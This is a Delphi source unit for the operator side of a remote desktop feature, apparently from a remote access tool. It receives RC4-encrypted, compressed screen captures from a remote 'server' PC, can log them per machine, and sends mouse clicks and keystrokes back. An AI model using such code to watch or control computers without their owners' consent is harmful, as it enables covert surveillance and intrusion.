unit UnitDesktop;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ExtCtrls, ComCtrls, UnitPrincipal, IdThreadMgr, IdThreadMgrDefault, IdAntiFreezeBase, IdAntiFreeze,
  IdBaseComponent, IdComponent, IdTCPServer, GR32_Image, GR32_Layers;

type
  TFormDesktop = class(TForm)
    Panel1: TPanel;
    CheckBox1: TCheckBox;
    CheckBox2: TCheckBox;
    CheckBox3: TCheckBox;
    Panel2: TPanel;
    Edit1: TEdit;
    TrackBar1: TTrackBar;
    ProgressBar1: TProgressBar;
    Button1: TButton;
    Button2: TButton;
    Button3: TButton;
    Edit2: TEdit;
    UpDown1: TUpDown;
    Label2: TLabel;
    Panel3: TPanel;
    Label3: TLabel;
    Label1: TLabel;
    Image1: TImage32;
    Timer1: TTimer;
    procedure FormCreate(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure TrackBar1Change(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Image1MouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer; Layer: TCustomLayer);
    procedure Image1MouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer; Layer: TCustomLayer);
    procedure Image1KeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure Timer1Timer(Sender: TObject);
  private
    { Private declarations }
    Servidor: PConexao;
    OldW, OldH: Integer;
    LastTick: dword;
    MouseCommand: string;
    LastKeyboard: integer;
    AThreadTransfer: TIdPeerThread;
    LastChange: integer;
    LastInterval, LastQuality: string;
    procedure WMExitSizeMove(var Meg: TMessage); message WM_EXITSIZEMOVE;
    procedure Mouse(Direction: byte; Button: TMouseButton; X, Y: integer);
  public
    { Public declarations }
    NomePC: string;
    Ratio: Single;
    OriginalX, OriginalY: integer;
    FecharForm: boolean;
    Teclas: string;
    procedure OnRead(Recebido: String; AThread: TIdPeerThread); overload;
    constructor Create(aOwner: TComponent; ConAux: PConexao);overload;
  end;

var
  FormDesktop: TFormDesktop;

implementation

{$R *.dfm}

uses
  UnitComandos,
  UnitStrings,
  UnitConexao,
  UnitCryptString,
  FuncoesDiversasCliente,
  Jpeg,
  UnitCompressString,
  IniFiles;

procedure TFormDesktop.WMExitSizeMove(var Meg: TMessage);
var
  TempStr: string;
  MudarTamanho: boolean;
begin
  MudarTamanho := true;
  if Width <> OldW then Height := Round(Width / Ratio) else
  if Height <> OldH then Width := Round(Height * Ratio) else MudarTamanho := false;
  TempStr := caption;
  if pos(' ---> ', Tempstr) > 0 then TempStr := copy(TempStr, 1, pos(' ---> ', Tempstr) - 1) else
  TempStr := Caption;
  Caption := TempStr + ' ---> ' + inttostr(Image1.Width) + ' X ' + inttostr(Image1.Height);
  OldW := Width;
  OldH := Height;

  if (LastChange <> 0) and (gettickcount < Lastchange + 500) then Exit;
  if ((LastInterval <> edit2.Text) or (LastQuality <> edit1.Text) or (MudarTamanho = true)) and
     (Button3.Enabled = true) then
  begin
    LastChange := gettickcount;
    EnviarString(Servidor.Athread, DESKTOPSETTINGS + '|' +
                                   Edit1.Text + '|' +
                                   inttostr(image1.Width) + '|' +
                                   inttostr(image1.Height) + '|' +
                                   Edit2.Text + '|', true);
    LastInterval := edit2.Text;
    LastQuality := edit1.Text;
  end;
end;

procedure TFormDesktop.FormCreate(Sender: TObject);
begin
  Ratio := 1;
end;

constructor TFormDesktop.Create(aOwner: TComponent; ConAux: PConexao);
begin
  inherited Create(aOwner);
  Servidor := ConAux;
end;

procedure TFormDesktop.OnRead(Recebido: String; AThread: TIdPeerThread);
var
  TempStr: string;
  SizeBuffer: int64;
  OndeSalvar: string;
  S: TMemoryStream;
  J: TJpegImage;
  b: TBitmap;
  i: integer;
begin
  if copy(recebido, 1, pos('|', recebido) - 1) = DESKTOP then
  begin

  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = DESKTOPPREVIEW then
  begin
    delete(recebido, 1, pos('|', recebido));
    if length(recebido) <= 0 then exit;
    label1.Caption := FormatByteSize(length(recebido));
    S := TMemoryStream.Create;
    StrToStream(S, recebido);
    S.Position := 0;
    j := TJpegImage.Create;
    j.LoadFromStream(S);
    S.Free;
    b := tbitmap.Create;
    b.Assign(j);
    j.Free;
    Image1.Bitmap.Assign(b);
    b.Free;
    Button1.Enabled := true;
    Button2.Enabled := true;
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = DESKTOPGETBUFFER then
  begin
    AThreadTransfer := Athread;

    delete(recebido, 1, pos('|', recebido));
    sleep(1000);

    Button3.Enabled := true;
    Teclas := '';

    while AThread.Connection.Connected = true do
    begin
      i := gettickcount;
      // sleep(5) alterado rsrs
      while gettickcount < i + 5 do application.ProcessMessages;

      Tempstr := AThread.Connection.ReadLn;
      if pos('|', Tempstr) <= 0 then continue;
      try
        SizeBuffer := strtoint(copy(Tempstr, 1, pos('|', Tempstr) - 1));
        except
        continue;
      end;
      if SizeBuffer <= 0 then continue;
      label1.Caption := FormatByteSize(SizeBuffer);
      ProgressBar1.Max := SizeBuffer;
      ProgressBar1.Position := 0;

      recebido := ReceberBuffer(SizeBuffer, AThread, ProgressBar1);
      recebido := EnDecryptStrRC4B(recebido, MasterPassword);
      recebido := DecompressString(recebido);

      if length(recebido) <= 0 then continue;
      S := TMemoryStream.Create;
      StrToStream(S, recebido);
      S.Position := 0;
      j := TJpegImage.Create;
      j.LoadFromStream(S);
      S.Free;
      b := tbitmap.Create;

      if CheckBox3.Checked = true then
      begin
        ForceDirectories(ExtractFilePath(ParamStr(0)) + 'Desktop\' + NomePC + '\');
        OndeSalvar := ExtractFilePath(ParamStr(0)) + 'Desktop\' + NomePC + '\' + inttostr(GetTickCount) + '.jpg'; // onde será salvo o log
        J.SaveToFile(OndeSalvar);
      end;

      b.Assign(j);
      j.Free;
      Image1.Bitmap.Assign(b);
      b.Free;

      if ((LastInterval <> edit2.Text) or (LastQuality <> edit1.Text)) and
         (Button3.Enabled = true) then
      sendMessage(handle, WM_EXITSIZEMOVE, 0, 0);
    end;

  end else

end;

procedure TFormDesktop.FormShow(Sender: TObject);
var
  Msg: TMessage;
  c: cardinal;

  IniFile: TIniFile;
  Qualidade: integer;
  Intervalo: integer;
begin
  if fileexists(FormPrincipal.SettingsFile) then
  begin
    IniFile := TIniFile.Create(FormPrincipal.SettingsFile);

    Qualidade := IniFile.ReadInteger('desktop', 'qualidade', 50);
    if Qualidade > 100 then Qualidade := 100;
    Intervalo := IniFile.ReadInteger('desktop', 'intervalo', 2);

    IniFile.Free;
  end;

  FecharForm := false;
  LastTick := 0;
  OldW := Width;
  OldH := Height;
  Button1.Caption := traduzidos[289];
  Button2.Caption := traduzidos[145];
  Button3.Caption := traduzidos[144];
  Label2.Caption := traduzidos[287];
  Label3.Caption := traduzidos[288];
  Checkbox2.Caption := traduzidos[290];
  Checkbox3.Caption := traduzidos[115];
  ProgressBar1.Position := 0;

  TrackBar1.Position := Qualidade;
  UpDown1.Position := intervalo;
  Edit1.Text := inttostr(TrackBar1.Position);
  Edit2.Text := inttostr(UpDown1.Position);

  Button1.Enabled := true;
  Button2.Enabled := true;
  Button3.Enabled := false;
  width := 500;
  sendMessage(Handle, WM_EXITSIZEMOVE, 0, 0);
  application.ProcessMessages;

  button2.Click;
end;

procedure TFormDesktop.TrackBar1Change(Sender: TObject);
begin
  Edit1.Text := inttostr(TrackBar1.Position);
end;

procedure TFormDesktop.FormClose(Sender: TObject;
  var Action: TCloseAction);
var
  IniFile: TIniFile;
begin
  if fileexists(FormPrincipal.SettingsFile) then
  begin
    IniFile := TIniFile.Create(FormPrincipal.SettingsFile);

    IniFile.WriteInteger('desktop', 'qualidade', TrackBar1.Position);
    IniFile.WriteInteger('desktop', 'intervalo', UpDown1.Position);

    IniFile.Free;
  end;

  Button3.Click;
  FecharForm := true;
end;

procedure TFormDesktop.Button1Click(Sender: TObject);
begin
  if Button2.Enabled = false then exit;
  Button1.Enabled := false;
  Button2.Enabled := false;
  Button3.Enabled := false;
  EnviarString(Servidor.Athread, DESKTOPPREVIEW + '|' +
                                 Edit1.Text + '|' +
                                 inttostr(image1.Width) + '|' +
                                 inttostr(image1.Height) + '|', true);
end;

procedure TFormDesktop.Button2Click(Sender: TObject);
begin
  LastInterval := edit2.Text;
  LastQuality := edit1.Text;

  timer1.Enabled := true;
  Button2.Enabled := false;
  Button1.Enabled := false;
  EnviarString(Servidor.Athread, DESKTOPGETBUFFER + '|' +
                                 Edit1.Text + '|' +
                                 inttostr(image1.Width) + '|' +
                                 inttostr(image1.Height) + '|' +
                                 Edit2.Text + '|', true);
end;

procedure TFormDesktop.Button3Click(Sender: TObject);
begin
  timer1.Enabled := false;
  Button3.Enabled := false;

  if AThreadTransfer <> nil then try AThreadTransfer.Connection.Disconnect; except end;

  Button1.Enabled := true;
  Button2.Enabled := true;
  Teclas := '';
end;

procedure TFormDesktop.Mouse(Direction: byte; Button: TMouseButton; X, Y: integer);
var
  Point: TPoint;
  xButton: integer;
  Delay: integer;
  i: integer;
  ToSend: string;
begin
  if LastTick = 0 then Delay := 0 else Delay := GetTickCount - LastTick;
  if Delay > GetDoubleClickTime + 1 then Delay := GetDoubleClickTime + 1;
  LastTick := GetTickCount;

  Point.X := (X * OriginalX) div Image1.Bitmap.Width;
  Point.Y := (Y * OriginalY) div Image1.Bitmap.Height;

  case Direction of
    1:
      case Button of
        mbLeft: xButton   := MOUSEEVENTF_LEFTDOWN;
        mbMiddle: xButton := MOUSEEVENTF_MIDDLEDOWN;
        mbRight: xButton  := MOUSEEVENTF_RIGHTDOWN;
      end;
    2:
      case Button of
        mbLeft: xButton   := MOUSEEVENTF_LEFTUP;
        mbMiddle: xButton := MOUSEEVENTF_MIDDLEUP;
        mbRight: xButton  := MOUSEEVENTF_RIGHTUP;
      end;
  end;
  if Direction = 1 then
  begin
    MouseCommand := MOUSEPOSITION + '|' +
                        inttostr(Point.X) + '|' +
                        inttostr(Point.Y) + '|' +
                        inttostr(xButton) + '|' +
                        inttostr(Handle) + '|';
  end else
  if Direction = 2 then
  begin
    ToSend := MouseCommand +
              inttostr(Point.X) + '|' +
              inttostr(Point.Y) + '|' +
              inttostr(xButton) + '|' +
              inttostr(delay) + '|';
    enviarstring(Servidor.Athread, ToSend, true);

    MouseCommand := '';
  end;
end;

procedure TFormDesktop.Image1MouseDown(Sender: TObject;
  Button: TMouseButton; Shift: TShiftState; X, Y: Integer;
  Layer: TCustomLayer);
begin
  if not CheckBox1.Checked then Exit;
  if button2.Enabled = true then exit;
  Image1.SetFocus;
  MouseCommand := '';
  Mouse(1, Button, X, Y);
end;

procedure TFormDesktop.Image1MouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer; Layer: TCustomLayer);
begin
  if not CheckBox1.Checked then Exit;
  if button2.Enabled = true then exit;
  Mouse(2, Button, X, Y);
end;

procedure TFormDesktop.Image1KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
var
  TempStr: string;
  ToSend: string;
begin
  if not CheckBox2.Checked then Exit;
  if button2.Enabled = true then exit;
  teclas := teclas + inttostr(key) + '|';
  if (LastKeyboard = 0) or (gettickcount > LastKeyboard + 100) then
  begin
    TempStr := teclas;
    teclas := '';
    LastKeyboard := gettickcount;

    ToSend := KEYBOARDKEY + '|' + TempStr;

    enviarstring(Servidor.Athread, ToSend, true);
  end;
end;

procedure TFormDesktop.Timer1Timer(Sender: TObject);
var
  TempStr: string;
  ToSend: string;
begin
  if button2.Enabled = true then exit;
  if ((LastKeyboard = 0) or (gettickcount > LastKeyboard + 100)) and (teclas <> '') and (CheckBox2.Checked = true) then
  begin
    TempStr := teclas;
    teclas := '';
    LastKeyboard := gettickcount;

    ToSend := KEYBOARDKEY + '|' + TempStr;

    enviarstring(Servidor.Athread, ToSend, true);
  end;
end;

end.
